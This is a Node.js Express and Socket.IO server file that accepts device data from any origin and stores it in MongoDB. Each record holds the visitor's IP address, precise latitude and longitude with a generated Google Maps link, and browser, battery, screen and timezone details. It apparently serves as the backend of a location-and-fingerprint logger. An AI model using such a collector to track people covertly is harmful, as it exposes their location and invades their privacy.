const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const mongoose = require('mongoose');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

const PORT = process.env.PORT || 3000;

const path = require('path');

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// MongoDB Connection
const mongoURI = process.env.MONGO_URI;
mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("✅ Connected to MongoDB"))
    .catch(err => console.error("❌ MongoDB connection error:", err));

// Define Schema
const DeviceDataSchema = new mongoose.Schema({
    ip: { type: String, required: true },
    latitude: { type: String, required: true },
    longitude: { type: String, required: true },
    mapsLink: { type: String, required: true },
    screenResolution: { type: String, required: true },
    platform: { type: String, required: true },
    browser: { type: String, required: true },
    batteryLevel: { type: String, required: true },
    chargingStatus: { type: String, required: true },
    touchSupport: { type: Boolean, required: true },
    orientation: { type: String, required: true },
    language: { type: String, required: true },
    timezone: { type: String, required: true },
    darkMode: { type: Boolean, required: true },
    deviceMemory: { type: String, required: true },
    timestamp: { type: Date, default: Date.now }
});

const DeviceData = mongoose.model("DeviceData", DeviceDataSchema);

io.on('connection', (socket) => {
    console.log("🔗 Client Connected:", socket.id);

    socket.on("deviceData", async (data) => {
        try {
            console.log("📥 Received Data:", data);
            const newDeviceData = new DeviceData({
                ...data,
                mapsLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
            });
            await newDeviceData.save();
            console.log("✅ Data saved successfully");
        } catch (error) {
            console.error("❌ Error saving data:", error);
        }
    });

    socket.on("disconnect", () => console.log("❌ Client Disconnected:", socket.id));
});

server.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
